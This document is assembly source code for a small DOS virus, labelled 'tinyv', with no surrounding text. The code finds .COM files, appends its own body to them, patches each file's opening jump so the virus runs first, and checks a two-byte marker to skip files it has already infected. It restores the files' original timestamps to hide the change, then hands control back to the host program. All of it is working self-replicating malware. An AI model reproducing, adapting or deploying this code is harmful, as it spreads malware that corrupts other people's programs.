	PAGE	,132
tinyv   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:tinyv
        ASSUME  SS:tinyv
        ASSUME  DS:tinyv
H00000	DB	0
H00001	DB	255 DUP(?)
program  PROC    FAR
        ASSUME  ES:tinyv
begin:
        JMP     pgstart                 ; start program
exlbl   LABEL   BYTE
        db      0CDh, 20h, 7, 8, 9
pgstart:
        CALL    tinyvir
mnprg   PROC    NEAR
tinyvir:
        POP     SI                      ; get SI for storage
        SUB     SI,offset tinyvir       ; reset SI to virus start
        MOV     BP,[SI+blnkdat]         ; store SI in BP for return
        ADD     BP,offset exlbl         ; Add to get original offset

        LEA     DX,[SI+fspec]           ; get filespec (*.COM)
        SUB     CX,CX                   ;        ||    (clear regs)
        MOV     AH,4EH                  ;        ||   (find files)
mainloop:                               ;       \||/
        INT     21H                     ;    ----\/----
        JC      hiccup                  ; no more files found, terminate virus
        MOV     DX,009EH                ; set file name pointer
        MOV     AX,3D02H                ; open file
        INT     21H                     ; do it!
        MOV     BX,AX                   ; move file handle to BX
        MOV     AH,3FH                  ; read file
        LEA     DX,[SI+endprog]         ; load end of program (as buffer pntr)
        MOV     DI,DX                   ; set Dest Index to area for buffer (?)
        MOV     CX,0003H                ; read 3 bytes
        INT     21H                     ; do it!
        CMP     BYTE PTR [DI],0E9H      ; check for JMP at start
        JE      infect                  ; If begins w/JMP, Infect
nextfile:
        MOV     AH,4FH                  ; set int 21 to find next file
        JMP     mainloop                ; next file, do it!
hiccup: JMP     nofile
infect:
        MOV     AX,5700h                ; get date function
        INT     21h                     ; do it!
        PUSH    DX                      ; store date + time
        PUSH    CX
        MOV     DX,[DI+01H]             ; set # of bytes to move
        MOV     [SI+blnkdat],DX         ;  "  " "    "   "   "
        SUB     CX,CX                   ;  "  " "    "   "   " (0 here)
        MOV     AX,4200H                ; move file
        INT     21H                     ; do it!
        MOV     DX,DI                   ; set dest index to area for buffer (?)
        MOV     CX,0002H                ; two bytes
        MOV     AH,3FH                  ; read file
        INT     21H                     ; do it!
        CMP     WORD PTR [DI],0807H     ; check for infection
        JE      nextfile                ; next file if infected
        SUB     DX,DX                   ; clear regs
        SUB     CX,CX                   ;   "    "
        MOV     AX,4202H                ; move file pointer
        INT     21H                     ; do it!
        CMP     DX,00H                  ; new pointer location 0?
        JNE     nextfile                ; if no then next file
        CMP     AH,0FEH                 ; new pointer loc too high?
        JNC     nextfile                ; yes, try again
        MOV     [SI+offset endprog+3],AX; point to data
        MOV     AH,40H                  ; write instruction
        LEA     DX,[SI+0105H]           ; write buffer loc    |
        MOV     CX,offset endprog-105h  ; (size of virus)  --\|/--
        INT     21H                     ; do it!
        JC      exit                    ; error, bug out
        MOV     AX,4200H                ; move pointer
        SUB     CX,CX                   ; clear reg
        MOV     DX,OFFSET H00001        ; where to set pointer
        INT     21H                     ; do it!
        MOV     AH,40H                  ; write to file
        LEA     DX,[SI+offset endprog+3]; write data at SI+1AB
        MOV     CX,0002H                ; two bytes (the JMP)
        INT     21H                     ; do it!
        MOV     AX,5701h                ; store date
        POP     CX                      ; restore time
        POP     DX                      ; restore date
        INT     21h                     ; do it!
exit:
        MOV     AH,3EH                  ; close file
        INT     21H                     ; do it!
nofile:

        JMP     BP                      ; go to original file
mnprg   ENDP
program  ENDP
blnkdat LABEL   WORD
        DW      0000H
fspec   LABEL   WORD
        DB      '*.COM'
	DB	0
endprog LABEL   WORD
tinyv   ENDS
        END     program
